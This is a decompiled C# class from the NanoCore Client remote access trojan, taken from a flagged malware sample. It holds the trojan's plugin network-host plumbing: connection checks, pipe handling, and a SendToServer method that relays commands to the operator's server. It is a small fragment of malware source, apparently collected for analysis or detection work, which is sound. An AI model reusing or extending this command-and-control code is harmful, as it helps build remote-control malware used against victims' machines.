// Decompiled with JetBrains decompiler
// Type: GClass4
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using NanoCore.ClientPluginHost;
using System;

public sealed class GClass4 : IClientNetworkHost
{
  public GClass3 gclass3_0;

  public GClass4(GClass3 gclass3_1) => this.gclass3_0 = gclass3_1;

  bool IClientNetworkHost.Connected => Class8.client_0.method_35();

  public void ClosePipe(string string_0)
  {
    if (!Class8.dictionary_2.ContainsKey(string_0))
      return;
    Class8.dictionary_2[string_0].method_56();
  }

  public bool PipeExists(string string_0) => Class8.dictionary_2.ContainsKey(string_0);

  public void Disconnect() => Class8.client_0.method_56();

  public void SendToServer(string string_0, bool bool_0, params object[] object_0)
  {
    if (object_0 == null)
    {
      Class8.smethod_85(this.gclass3_0, new Exception("One or more parameters are null."), nameof (SendToServer));
    }
    else
    {
      Client client0 = Class8.client_0;
      if (!string.IsNullOrEmpty(string_0))
      {
        if (!Class8.dictionary_2.ContainsKey(string_0))
          return;
        client0 = Class8.dictionary_2[string_0];
      }
      Class8.smethod_89(client0, bool_0, CommandType.BaseCommand, (byte) 4, this.gclass3_0.guid_0, object_0);
    }
  }

  public void AddHostEntry(string string_0) => Class8.smethod_64(string_0);

  public void RebuildHostCache() => Class8.smethod_63();
}
